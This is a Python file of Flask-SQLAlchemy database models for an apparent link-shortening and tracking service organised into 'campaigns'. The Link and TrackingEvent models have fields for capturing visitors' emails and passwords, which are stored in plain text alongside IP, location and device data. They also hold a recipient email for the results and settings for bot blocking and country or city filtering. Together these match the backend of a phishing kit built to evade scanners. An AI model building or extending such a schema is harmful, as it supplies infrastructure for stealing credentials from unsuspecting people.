from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
import json

db = SQLAlchemy()

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)
    
    # Relationships
    links = db.relationship('Link', backref='user', lazy=True, cascade='all, delete-orphan')
    campaigns = db.relationship('Campaign', backref='user', lazy=True, cascade='all, delete-orphan')
    
    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)
    
    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'last_login': self.last_login.isoformat() if self.last_login else None
        }

class Campaign(db.Model):
    __tablename__ = 'campaigns'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    name = db.Column(db.String(255), nullable=False)
    description = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationships
    links = db.relationship('Link', backref='campaign', lazy=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'name': self.name,
            'description': self.description,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'links_count': len(self.links)
        }

class Link(db.Model):
    __tablename__ = 'links'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    short_code = db.Column(db.String(10), unique=True, nullable=False)
    target_url = db.Column(db.Text, nullable=False)
    title = db.Column(db.String(255))
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id'))
    total_clicks = db.Column(db.Integer, default=0)
    real_visitors = db.Column(db.Integer, default=0)
    blocked_attempts = db.Column(db.Integer, default=0)
    capture_email = db.Column(db.Boolean, default=False)
    capture_password = db.Column(db.Boolean, default=False)
    bot_blocking_enabled = db.Column(db.Boolean, default=True)
    geo_targeting_enabled = db.Column(db.Boolean, default=False)
    rate_limiting_enabled = db.Column(db.Boolean, default=False)
    allowed_countries = db.Column(db.Text)  # JSON array
    blocked_countries = db.Column(db.Text)  # JSON array
    allowed_cities = db.Column(db.Text)  # JSON array
    blocked_cities = db.Column(db.Text)  # JSON array
    recipient_email = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    tracking_events = db.relationship('TrackingEvent', backref='link', lazy=True, cascade='all, delete-orphan')
    
    def get_allowed_countries(self):
        return json.loads(self.allowed_countries) if self.allowed_countries else []
    
    def set_allowed_countries(self, countries):
        self.allowed_countries = json.dumps(countries)
    
    def get_blocked_countries(self):
        return json.loads(self.blocked_countries) if self.blocked_countries else []
    
    def set_blocked_countries(self, countries):
        self.blocked_countries = json.dumps(countries)
    
    def get_allowed_cities(self):
        return json.loads(self.allowed_cities) if self.allowed_cities else []
    
    def set_allowed_cities(self, cities):
        self.allowed_cities = json.dumps(cities)
    
    def get_blocked_cities(self):
        return json.loads(self.blocked_cities) if self.blocked_cities else []
    
    def set_blocked_cities(self, cities):
        self.blocked_cities = json.dumps(cities)
    
    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'short_code': self.short_code,
            'target_url': self.target_url,
            'title': self.title,
            'campaign_id': self.campaign_id,
            'total_clicks': self.total_clicks,
            'real_visitors': self.real_visitors,
            'blocked_attempts': self.blocked_attempts,
            'capture_email': self.capture_email,
            'capture_password': self.capture_password,
            'bot_blocking_enabled': self.bot_blocking_enabled,
            'geo_targeting_enabled': self.geo_targeting_enabled,
            'rate_limiting_enabled': self.rate_limiting_enabled,
            'allowed_countries': self.get_allowed_countries(),
            'blocked_countries': self.get_blocked_countries(),
            'allowed_cities': self.get_allowed_cities(),
            'blocked_cities': self.get_blocked_cities(),
            'recipient_email': self.recipient_email,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None,
            'campaign_name': self.campaign.name if self.campaign else None
        }

class TrackingEvent(db.Model):
    __tablename__ = 'tracking_events'
    
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey('links.id'), nullable=False)
    ip_address = db.Column(db.String(45), nullable=False)  # Support IPv6
    user_agent = db.Column(db.Text)
    referer = db.Column(db.Text)
    country = db.Column(db.String(2))  # ISO country code
    country_name = db.Column(db.String(100))
    city = db.Column(db.String(100))
    is_bot = db.Column(db.Boolean, default=False)
    is_blocked = db.Column(db.Boolean, default=False)
    captured_email = db.Column(db.String(255))
    captured_password = db.Column(db.String(255))
    device_type = db.Column(db.String(50))
    browser = db.Column(db.String(50))
    os = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='Open')  # Open, Redirected, On Page
    
    def to_dict(self):
        return {
            'id': self.id,
            'link_id': self.link_id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'referer': self.referer,
            'country': self.country,
            'country_name': self.country_name,
            'city': self.city,
            'is_bot': self.is_bot,
            'is_blocked': self.is_blocked,
            'captured_email': self.captured_email,
            'captured_password': self.captured_password,
            'device_type': self.device_type,
            'browser': self.browser,
            'os': self.os,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'status': self.status,
            'link_title': self.link.title if self.link else None,
            'link_short_code': self.link.short_code if self.link else None
        }
